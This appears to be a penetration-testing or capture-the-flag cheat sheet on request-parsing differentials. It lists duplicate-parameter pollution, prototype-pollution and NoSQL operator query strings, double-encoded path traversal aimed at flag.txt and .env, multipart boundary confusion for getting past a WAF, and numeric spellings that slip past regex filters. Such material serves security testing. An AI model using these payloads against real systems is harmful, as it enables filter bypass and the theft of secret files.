# Request Parsing

## Duplicate Parameters

```text
?role=user&role=admin
?id=1&id=2
```

```http
POST /login?username=guest
Content-Type: application/x-www-form-urlencoded

username=admin&password=x
```

Check which layer uses first value, last value, joined value, or array value.

```text
frontend validates id=1, backend receives id=2
frontend sees safe boundary, backend sees malicious boundary
frontend parses JSON, backend parses form
```

## Express extended qs

```text
?q=abc
?q[]=abc&q[]=def
?q[a]=abc
?q[toString]=abc
?__proto__[x]=1
```

## Frontend Filter, Backend Forward

Use when the outer service validates parsed params but forwards the original raw query to an internal service.

```text
/search?q=blocked&q=allowed
/search?q[$ne]=x
/search?q=a%2520b
/search?action=get&id=1
```

## Encoded Separators

```text
%2f
%252f
%5c
%255c
%00
%0a
%09
```

## Path Oddities

```text
/static/..%2f..%2fflag.txt
/static/?/../../.env
/api;/admin
/api%2f..%2fadmin
```

## Multipart Differential

```http
Content-Type: multipart/form-data; boundary=REAL; boundary=FAKE
```

```text
1. Put a harmless complete multipart body under FAKE.
2. Put the actual backend payload under REAL.
3. Check whether the frontend/WAF uses a different boundary from the backend.
```

Also test:

```text
duplicate boundary params
quoted vs unquoted boundary
part charset: utf-8, latin1, utf-16le
same field name repeated
field vs file part split
name* extended parameter encoding
```

## Numeric Grammar

Regex filters often assume one spelling for a number.

```text
0
+0
-0
00
0x0
a
0a
```

Examples:

```text
backend parseInt(value, 16) accepts a as 10
backend parseInt("+0", 16) accepts 0
WAF regex \$@\d+ misses $@+0
```
